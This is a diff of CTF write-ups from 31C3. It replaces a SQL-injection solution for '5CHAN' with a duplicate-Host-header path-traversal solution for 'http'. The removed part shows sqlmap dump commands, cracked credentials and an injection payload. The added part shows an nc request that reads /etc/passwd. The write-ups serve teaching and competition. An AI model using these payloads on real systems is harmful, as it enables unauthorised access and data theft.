@@ -1,64 +1,29 @@
-# 5CHAN
+# http
 
 **Category:** Web
+
 **Points:** 15
+
 **Description:**
 
-> 5CHAN? never heard of this image board, but they have exactly what we need,the picture we're looking for is not for public, so can you get it?
-> http://188.40.18.89/
+> Check out our cool webserver. It is really fast because it is implemented in C. For security we use the versatility of ruby.
+> 
+> Get the source at: https://31c3ctf.aachen.ccc.de/uploads/http.tar.bz2
+> 
+> Some example sites hosted with our webserver:
+> 
+> - http://works.90.31c3ctf.aachen.ccc.de/works.html
+> - http://31c3ctf.90.31c3ctf.aachen.ccc.de/announcements.html
 
 ## Write-up
 
-5CHAN was a simple image site.
+The webserver was using a simple regex check in Ruby to filter malicious requests.
 
-It contained 8 different images on the frontpage. While there was a register link, registration was disabled. There was also a login page and search bar, but both seemed to do nothing.
+We noticed the firewall was only checking the last HOST parameter in a request, so we crafted an HTTP request containg two different HOST parameters. The first HOST parameter was malicious and attempted path traversal, while the second was a legitimate one.
 
-The goal was to find a private image hidden on the site.
-
-Clicking on an image brought us to its page:
-`http://188.40.18.89/?page=pic&id=1`
-
-The id parameter was susceptible to SQL injection:
-http://188.40.18.89/?page=pic&id=%27
-
-We started enumerating databases:
 ```bash
-$ sqlmap -u "http://188.40.18.89/?id=1&page=pic" --dbs --threads 10
+$ echo -e "GET /passwd HTTP/1.1\r\nHost: ../../../../../../../etc\r\nHost: 90.31c3ctf.aachen.ccc.de\r\n\r\n" | nc 90.31c3ctf.aachen.ccc.de 80
 ```
 
-And found a database called `5chan`. We enumerated the tables: 
-`pictures` and `users`.
-
-And dumped them:
-```bash
-$ sqlmap -u "http://188.40.18.89/?id=8&page=pic" -D 5chan -T pictures --dump --threads 10
-$ sqlmap -u "http://188.40.18.89/?id=8&page=pic" -D 5chan -T users --dump --threads 10
-```
-
-The users table contained several usernames including their password in SHA1. Doing a quick search led us to immediately find following user accounts:
-`unfoldedclunk:abcdef` and `boxercheek:123456`.
-
-The pictures table included 9 pictures, the final one being the flag with id 9. Unfortunately, trying the above link with this id did not give us any result.
-
-We proceeded to check for other clues and found a [robots.txt](robots.txt) file in the http root. This file mentioned a special folder: `/.OurBackupz/`. This folder included a backup of the code and database. 
-
-The database did not contain any passwords (unlike our dump) but we now possessed the original source code for the image board.
-
-In `/__pages/__pic.php` we found following line used to return an image:
-
-```php
-$request="SELECT * FROM pictures WHERE level<=$access AND id=".mysqli_real_escape_string($con,@$_GET['id']." LIMIT 0,1");
-```
-
-While they used mysqli_real_escape_string() to escape any malicious characters, they forgot to put quotes around it, making following injection possible:
-
-```mysql
-SELECT * FROM pictures WHERE level<=1 AND id=9 OR id=9 AND 1=1 LIMIT 0,1
-```
-
-With this payload:
-
-`http://188.40.18.89/?page=pic&id=9 OR id=9 AND 1=1`
-
-The flag.jpg image was shown, containing the flag:
-`31c3_st0Pp_Us1nG_==_&&_St4rt_Us1Ng_===`
+Since the firewall only checked the last (second) one, our malicious parameter got through and was used to read out the passwd file containing the flag:
+`31C3_b45fa9e4d5969e3c524bdcde15f84125`
